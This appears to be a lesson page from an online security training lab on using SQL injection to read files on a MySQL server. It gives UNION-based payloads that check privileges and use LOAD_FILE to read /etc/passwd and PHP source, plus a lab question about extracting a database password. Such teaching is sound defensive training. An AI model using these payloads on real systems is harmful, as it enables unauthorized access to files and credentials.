
<h1>Reading Files</h1>
<hr/>
<p>In addition to gathering data from various tables and databases within the DBMS, a SQL Injection can also be leveraged to perform many other operations, such as reading and writing files on the server and even gaining remote code execution on the back-end server.</p>
<hr/>
<h2>Privileges</h2>
<p>Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in <code>MySQL</code>, the DB user must have the <code>FILE</code> privilege to load a file's content into a table and then dump data from that table and read files. So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.</p>
<h4>DB User</h4>
<p>First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:</p>
<pre><code class="language-sql">SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
</code></pre>
<p>Our <code>UNION</code> injection payload will be as follows:</p>
<pre><code class="language-sql">cn' UNION SELECT 1, user(), 3, 4-- -
</code></pre>
<p>or:</p>
<pre><code class="language-sql">cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
</code></pre>
<p>Which tells us our current user, which in this case is <code>root</code>:</p>
<img alt="Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entry includes root@localhost, 3, and 4" class="website-screenshot" data-url="http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, user(), 3, 4-- -" src="/storage/modules/33/db_user.jpg"/>
<p>This is very promising, as a root user is likely to be a DBA, which gives us many privileges.</p>
<h4>User Privileges</h4>
<p>Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:</p>
<pre><code class="language-sql">SELECT super_priv FROM mysql.user
</code></pre>
<p>Once again, we can use the following payload with the above query:</p>
<pre><code class="language-sql">cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
</code></pre>
<p>If we had many users within the DBMS, we can add <code>WHERE user="root"</code> to only show privileges for our current user <code>root</code>:</p>
<pre><code class="language-sql">cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
</code></pre>
<img alt="Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entry includes root@localhost, 3, and 4" class="website-screenshot" data-url="http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -" src="/storage/modules/33/root_privs.jpg"/>
<p>The query returns <code>Y</code>, which means <code>YES</code>, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:</p>
<pre><code class="language-sql">cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
</code></pre>
<p>From here, we can add <code>WHERE grantee="'root'@'localhost'"</code> to only show our current user <code>root</code> privileges. Our payload would be:</p>
<pre><code class="language-sql">cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
</code></pre>
<p>And we see all of the possible privileges given to our current user:
<img alt="Search interface with a text box containing 'cn' UNION SELECT 1, grant' and a button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entries include 'root'@'localhost' with Port City values like SELECT, INSERT, UPDATE, and Port Volume 4" class="website-screenshot" data-url="http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -" src="/storage/modules/33/root_privs_2.jpg"/></p>
<p>We see that the <code>FILE</code> privilege is listed for our user, enabling us to read files and potentially even write files. Thus, we can proceed with attempting to read files.</p>
<hr/>
<h2>LOAD_FILE</h2>
<p>Now that we know we have enough privileges to read local system files, let us do that using the <code>LOAD_FILE()</code> function.  The <a href="https://mariadb.com/kb/en/load_file/">LOAD_FILE()</a> function can be used in MariaDB / MySQL to read data from files.  The function takes in just one argument, which is the file name. The following query is an example of how to read the <code>/etc/passwd</code> file:</p>
<pre><code class="language-sql">SELECT LOAD_FILE('/etc/passwd');
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0">Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.</p>
</div>
</div>
<p>Similar to how we have been using a <code>UNION</code> injection, we can use the above query:</p>
<pre><code class="language-sql">cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
</code></pre>
<img alt="Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entries include user information like root:x:0:0:root:/root:/bin/bash and daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" class="website-screenshot" data-url="http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -" src="/storage/modules/33/load_file_sqli.png"/>
<p>We were able to successfully read the contents of the passwd file through the SQL injection. Unfortunately, this can be potentially used to leak the application source code as well.</p>
<hr/>
<h2>Another Example</h2>
<p>We know that the current page is <code>search.php</code>. The default Apache webroot is <code>/var/www/html</code>. Let us try reading the source code of the file at <code>/var/www/html/search.php</code>.</p>
<pre><code class="language-sql">cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
</code></pre>
<img alt="Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume." class="website-screenshot" data-url="http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, LOAD_FILE('/var/www/html/search.php'), 3, 4-- -" src="/storage/modules/33/load_file_search.png"/>
<p>However, the page ends up rendering the HTML code within the browser. The HTML source can be viewed by hitting <code>[Ctrl + U]</code>.</p>
<p><img alt="PHP code snippet for querying a database. It checks if 'port_code' is set, constructs a SQL query to select from 'ports' where code matches, executes the query, and fetches results" src="https://academy.hackthebox.com/storage/modules/33/load_file_source.png"/></p>
<p>The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities.</p>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                    </span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
</div>
</div>
<div>
<div>
<label class="module-question" for="34"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer34" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-34">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="34" id="btnAnswer34">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="mb-4 mr-1">
<button class="btn btn-outline-warning btn-block" data-target="#hint34" data-toggle="modal" id="hintBtn34"><i class="fad fa-life-ring mr-2"></i> Hint
                                        </button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
